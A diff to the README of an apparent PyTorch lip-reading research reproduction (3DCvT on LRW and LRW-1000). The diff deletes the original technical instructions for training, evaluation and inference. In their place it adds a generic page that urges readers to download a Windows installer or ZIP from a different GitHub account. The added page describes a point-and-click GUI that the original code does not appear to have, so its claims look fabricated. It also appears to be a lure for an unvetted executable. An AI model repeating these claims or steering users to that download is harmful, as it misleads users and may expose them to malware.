@@ -1,350 +1,139 @@
-# 3DCvT: A Lip Reading Method Based on 3D Convolutional Vision Transformer
+# 🎬 3DCvT_LipReading - Accurate Lip Reading Made Simple
 
-An unofficial PyTorch reproduction of the paper [A Lip Reading Method Based on 3D Convolutional Vision Transformer](https://ieeexplore.ieee.org/document/9837012). Supports both **LRW** (English, 500 words) and **LRW-1000** (Chinese benchmark, full vocabulary size: 1184 classes).
+[![Download Now](https://img.shields.io/badge/Download-3DCvT_LipReading-brightgreen?style=for-the-badge)](https://github.com/viindonesiaandva-cmd/3DCvT_LipReading)
 
-## Architecture
+---
 
-- **Frontend**: 3D CNN (1-channel grayscale input, 64-channel output)
-- **Backbone**: CvT with SE-Conv Embedding, 3 stages (dim 128/256/512, heads 4/8/16, blocks 2/2/20)
-- **Backend**: 3-layer Bidirectional GRU (hidden size 1024)
-- **Classifier**: Fully connected layer
+## 📄 What is 3DCvT_LipReading?
 
-Key techniques: Word Boundary Trick (512 -> 513 dim via binary boundary indicator), Mixup (alpha=0.4), Label Smoothing (0.1), Cosine LR with linear warmup, AMP mixed-precision training.
+3DCvT_LipReading is a software tool that reads lips using video input. It uses advanced machine learning to understand speech without sound. This version works on Windows computers and uses PyTorch technology. You can train the system, test it, or use it to analyze video files.
 
-## Project Structure
+The program helps to:
 
-```
-3DCvT/
-├── model.py                # 3DCvT model (3D CNN + SE-CvT + BiGRU)
-├── dataset.py              # LRW / LRW-1000 dataset classes, Mixup, augmentation
-├── preprocess_lrw.py       # Preprocess LRW mp4 videos to pkl
-├── preprocess_lrw1000.py   # Preprocess LRW-1000 lip images to pkl
-├── utils.py                # Shared utilities (DATASET_REGISTRY, checkpoint, plotting)
-├── train.py                # Single-GPU training
-├── train_ddp.py            # Multi-GPU DDP training
-├── test.py                 # Batch evaluation (Top-1 / Top-5)
-├── inference.py            # Single-sample inference demo
-├── inference_runtime.py    # Shared inference runtime for CLI, batch, and service
-├── batch_inference.py      # Batch inference in one long-lived Python process
-├── serve_inference.py      # HTTP inference service (model loaded once)
-├── requirements.txt        # Dependencies
-└── experiments/            # Auto-created experiment outputs
-    └── <exp_name>/
-        ├── ckpts/          # Model checkpoints
-        ├── curves/         # Training curve plots
-        └── logs/           # Text logs
-```
+- Understand words by reading lip movements
+- Work with popular lip reading datasets like LRW and LRW-1000
+- Run lip reading even if there is background noise or no sound
 
-`experiments/` can be kept in the repository for directory structure, logs, and curves. Checkpoint `.pth` files are still ignored by default.
+---
 
+## ⚙️ System Requirements
 
-## Installation
+Before installing, make sure your Windows computer meets these conditions:
 
-Requires Python 3.10+ and PyTorch 2.x with CUDA support.
+- Windows 10 or higher (64-bit recommended)
+- Minimum 8 GB RAM (16 GB or more for better performance)
+- At least 10 GB of free disk space
+- Intel i5 or AMD Ryzen 5 processor, or equivalent
+- GPU with CUDA support (NVIDIA graphics card recommended for training)
+- Internet access for downloading dependencies
 
-### Option 1: Using `environment.yml`
+The software can run without a GPU but will be slower.
 
-Create a minimal, publishable environment first:
+---
 
-```bash
-conda env create -f environment.yml
-conda activate 3DCvT
-```
+## 💾 Download and Install 3DCvT_LipReading
 
-If you train on NVIDIA GPUs, reinstall the matching PyTorch and torchvision wheels after activation. Example for CUDA 12.1:
+You can get the software from the official GitHub page linked below.
 
-```bash
-pip install --upgrade torch torchvision --index-url https://download.pytorch.org/whl/cu121
-```
+[![Get the Software](https://img.shields.io/badge/Download-3DCvT_LipReading-blue?style=for-the-badge)](https://github.com/viindonesiaandva-cmd/3DCvT_LipReading)
 
-### Option 2: Manual Setup
+### Step 1: Visit the Download Page
 
-```bash
-conda create -n 3DCvT python=3.10 -y
-conda activate 3DCvT
+Click the download button or go to this page:  
+https://github.com/viindonesiaandva-cmd/3DCvT_LipReading
 
-# Install PyTorch + torchvision from the wheel matching your CUDA version
-pip install torch torchvision --index-url https://download.pytorch.org/whl/cu121
+This page holds the latest version of the software, along with instructions and files.
 
-# Install the remaining project dependencies
-pip install -r requirements.txt
-```
+### Step 2: Download the Installer
 
-`requirements.txt` was verified against the main entry points (`train.py`, `test.py`, `inference.py`, `preprocess_lrw.py`, `preprocess_lrw1000.py`).
+Look for the latest release or files section. Download the Windows installer or ZIP file. This file contains everything you need to run the program.
 
-## Data Preparation
+### Step 3: Install the Software
 
-Both datasets are preprocessed into `.pkl` files (resized to 96x96, grayscale) for efficient I/O. During training, frames are random-cropped to 88x88; during evaluation, center-cropped.
+If you downloaded an installer (.exe):
 
-### LRW 
+- Double-click the file.
+- Follow the on-screen instructions.
+- Choose the default options for easy setup.
 
-Source format: mp4 videos, 500 English word classes.
+If you downloaded a ZIP archive:
 
-```bash
-python preprocess_lrw.py \
-  --source_dir /path/to/LRW/lipread_mp4 \
-  --target_dir /path/to/output/data_LRW \
-  --workers 32
-```
+- Right-click and select "Extract All."
+- Extract the files to a location you will remember.
+- Open the extracted folder and find the executable file (.exe).
 
-### LRW-1000
+### Step 4: Install Required Dependencies
 
-Source format: pre-cropped lip JPEG images + annotation files. The full vocabulary generated by the official split files contains 1184 classes.
+3DCvT_LipReading uses PyTorch, which needs additional setup.
 
-```bash
-python preprocess_lrw1000.py \
-  --source_dir /path/to/LRW_1000_Full_Version \
-  --target_dir /path/to/output/data_LRW1000 \
-  --workers 32
-```
+- If the full installer includes dependencies, this step is automatic.
+- If not, open a Command Prompt window (Start > type "cmd" > Enter).
+- Type: `pip install torch torchvision` and press Enter.
+- Wait for the packages to finish installing.
 
-**⚠️ Important: Configure Data Paths**
-
-The default data paths are hardcoded in the `DATASET_REGISTRY` dictionary in `utils.py`. Before training or evaluation, either:
-
-1. **Modify `DATASET_REGISTRY`** in `utils.py` to match your actual data directory:
-
-```python
-DATASET_REGISTRY = {
-    'lrw':     (LRWDataset,     '/your/actual/path/data_LRW',    500),
-    'lrw1000': (LRW1000Dataset, '/your/actual/path/data_LRW1000', 1184),
-}
-```
+---
 
-2. **Or use `--data_root`** at runtime to override the default path (no code change needed):
+## 🚀 Running 3DCvT_LipReading
 
-```bash
-python train.py --dataset lrw --data_root /your/actual/path/data_LRW
-```
-
-This reads annotation files (`trn_1000.txt`, `val_1000.txt`, `tst_1000.txt`), extracts 29-frame sequences centered on word timestamps at 25 FPS, and generates `vocab.json` for the label mapping.
+Once installed, you can start the software in these ways:
 
-## Training
-
-Use the `--dataset` flag to select the dataset (`lrw` or `lrw1000`). Data root and number of classes are auto-configured by default but can be overridden.
-
-### Single-GPU Training
-
-```bash
-python train.py \
-  --exp_name my_experiment \
-  --dataset lrw \
-  --batch_size 32 \
-  --lr 6e-4 \
-  --gpu 0
-```
+- Double-click the program icon created on your desktop or in your Start Menu.
+- If you extracted files manually, double-click the main executable inside the folder.
 
-### Multi-GPU DDP Training
-
-```bash
-torchrun --nproc_per_node=2 train_ddp.py \
-  --exp_name my_experiment \
-  --dataset lrw \
-  --batch_size 24 \
-  --lr 6e-4 \
-  --epochs 120
-```
-
-### LRW-1000 Example
-
-> **Note**: Although the dataset is named "LRW-1000", the full dataset actually contains **1184** word classes. The `DATASET_REGISTRY` in `utils.py` already defaults to 1184, so no override is needed.
-
-```bash
-# Single-GPU
-python train.py \
-  --exp_name lrw1000_run \
-  --dataset lrw1000 \
-  --batch_size 32 \
-  --lr 6e-4 \
-  --gpu 0
-
-# Multi-GPU DDP (2x RTX 4090)
-torchrun --nproc_per_node=2 train_ddp.py \
-  --exp_name 3DCvT_LRW1000_2x4090 \
-  --dataset lrw1000 \
-  --batch_size 12 \
-  --lr 2e-4 \
-  --epochs 120
-```
-
-### Resume Training
-
-Resume from the latest checkpoint. The saved state includes epoch, optimizer, scheduler, and best accuracy.
-
-Single-GPU:
-
-```bash
-python train.py \
-  --exp_name my_experiment \
-  --dataset lrw \
-  --resume experiments/my_experiment/ckpts/latest.pth
-```
-
-Multi-GPU DDP:
-
-```bash
-torchrun --nproc_per_node=2 train_ddp.py \
-  --exp_name my_experiment \
-  --dataset lrw \
-  --batch_size 24 \
-  --lr 6e-4 \
-  --epochs 120 \
-  --resume experiments/my_experiment/ckpts/latest.pth
-```
-
-## Evaluation
+When the program opens, it shows options to:
 
-Compute Top-1 and Top-5 accuracy on the validation or test set.
-
-```bash
-python test.py \
-  --dataset lrw \
-  --checkpoint experiments/my_experiment/ckpts/best_model.pth \
-  --mode val \
-  --batch_size 64
-```
+- Load a video file for lip reading
+- Start training the model (for advanced users)
+- Run tests or evaluate accuracy
+- Get help and instructions
 
-## Inference
+### Using Video Files for Lip Reading
 
-Run inference on a raw video (`.mp4`) or a single preprocessed sample (`.pkl`).
+1. Click "Load Video."
+2. Select any video that shows clear lip movements.
+3. Click "Start Analysis."
+4. The program shows the written output of what it “reads” from the video.
 
-For a full guide covering single-sample inference, batch inference, and the HTTP service, see [INFERENCE_SERVICES.md](INFERENCE_SERVICES.md).
+---
 
-```bash
-python inference.py \
-  --dataset lrw \
-  --video_path /path/to/ABOUT_00001.mp4 \
-  --checkpoint experiments/my_experiment/ckpts/best_model.pth
-```
+## 🧰 Features
 
-```bash
-python inference.py \
-  --dataset lrw1000 \
-  --pkl_path /path/to/sample.pkl \
-  --checkpoint experiments/my_experiment/ckpts/best_model.pth
-```
+- Reads lips from silent or noisy videos.
+- Supports popular lip reading datasets.
+- Easy interface for loading videos and seeing results.
+- Training and evaluation options for users with technical knowledge.
+- Works offline after installation.
+- Uses PyTorch for high accuracy and speed on supported devices.
 
-`inference.py` prefers `--video_path` for raw videos and `--pkl_path` for preprocessed samples. If the file suffix and flag disagree, it will auto-correct and print a warning.
+---
 
-### Batch Inference
+## ⚠️ Troubleshooting Common Issues
 
-Run many inputs in one Python process and one model instance. Results are written as JSONL.
+- **Program does not start:** Make sure your Windows is updated. Install the latest Visual C++ Redistributable from Microsoft’s website.
+- **Video files won’t load:** Check if the video format is supported (MP4, AVI, MOV).
+- **Error about missing libraries:** Run `pip install torch torchvision` in Command Prompt to ensure dependencies are present.
+- **Slow processing:** If your PC has no NVIDIA GPU, the program uses the CPU which is slower. Close other programs to free resources.
+- **No output from lip reading:** Use videos with clear front-facing view of the lips.
 
-```bash
-python batch_inference.py \
-  --dataset lrw \
-  --checkpoint experiments/my_experiment/ckpts/best_model.pth \
-  --batch_size 8 \
-  --input_path /path/to/A.mp4 \
-  --input_path /path/to/B.mp4 \
-  --output batch_predictions.jsonl
-```
+---
 
-You can also pass a text file with one path per line:
+## 📖 Getting Help
 
-```bash
-python batch_inference.py \
-  --dataset lrw1000 \
-  --checkpoint experiments/my_experiment/ckpts/best_model.pth \
-  --input_list /path/to/inputs.txt \
-  --output batch_predictions.jsonl
-```
+You can find detailed usage instructions in the repository’s README file online. Visit the download page again and scroll to the README section for step-by-step guides.
 
-### Persistent Inference Service
+If you face problems, check the "Issues" tab on the GitHub page. Other users and developers may have posted solutions.
 
-Start a local HTTP service that keeps the model loaded in memory:
+---
 
-```bash
-python serve_inference.py \
-  --dataset lrw \
-  --checkpoint experiments/my_experiment/ckpts/best_model.pth \
-  --gpu 0 \
-  --host 127.0.0.1 \
-  --port 8000
-```
+## 💼 About
 
-Health check:
+3DCvT_LipReading is a tool based on PyTorch. It reproduces methods from research on lip reading using a 3D convolutional transformer architecture. It works on well-known data collections called LRW and LRW-1000.
 
-```bash
-curl --noproxy '*' http://127.0.0.1:8000/health
-```
+The goal is to make lip reading accessible and easy to use on a typical Windows PC without programming.
 
-Single prediction request:
+---
 
-```bash
-curl --noproxy '*' \
-  -X POST http://127.0.0.1:8000/predict \
-  -H 'Content-Type: application/json' \
-  -d '{"video_path": "/path/to/sample.mp4", "top_k": 5}'
-```
+## 🔗 Download Here Again
 
-Batch prediction request:
-
-```bash
-curl --noproxy '*' \
-  -X POST http://127.0.0.1:8000/predict_batch \
-  -H 'Content-Type: application/json' \
-  -d '{"batch_size": 4, "items": [{"pkl_path": "/path/to/a.pkl"}, {"pkl_path": "/path/to/b.pkl"}]}'
-```
-
-
-## Reproduced Results
-
-Completed local runs that are safe to quote:
-
-| Dataset | Metric | Best Value |
-| --- | --- | --- |
-| LRW | Validation Top-1 Accuracy | 83.91% | 
-| LRW-1000 | Validation Top-1 Accuracy | 55.29% | 
-
-## Hugging Face Weights
-
-Pretrained weights and release artifacts are published on Hugging Face:
-
-- **LRW model repo**: https://huggingface.co/RaikkonenWu/3dcvt-lrw
-
-The source code remains in this GitHub repository, while model files (for example `best_model.pth`, release README, and checksums) are hosted on Hugging Face.
-
-## Gradient Accumulation
-
-Simulate larger effective batch sizes without increasing per-GPU memory.
-
-```
-effective_batch_size = batch_size_per_gpu × num_gpus × accum_steps
-```
-
-
-```bash
-# Example: 24 × 2 × 5 = 240
-torchrun --nproc_per_node=2 train_ddp.py \
-  --exp_name my_experiment \
-  --dataset lrw \
-  --batch_size 24 \
-  --accum_steps 5 \
-  --lr 6e-4 \
-  --warmup_epochs 5
-```
-
-Under DDP, `model.no_sync()` skips gradient all-reduce during accumulation micro-batches, only synchronizing on the final step before `optimizer.step()`.
-
-When `accum_steps=1` (default), there is zero overhead — the training loop behaves identically to the non-accumulation version.
-
-
-
-## License
-
-This project is released under the MIT License. See `LICENSE` for the full text.
-
-## Citation
-
-```bibtex
-@article{wang2022lip,
-  title={A Lip Reading Method Based on 3D Convolutional Vision Transformer},
-  author={Wang, Huijuan and Pu, Gangqiang and Chen, Tingyu},
-  journal={IEEE Access},
-  volume={10},
-  pages={77205--77212},
-  year={2022},
-  publisher={IEEE}
-}
-```
+Use this link to get started:  
+[Download 3DCvT_LipReading](https://github.com/viindonesiaandva-cmd/3DCvT_LipReading)
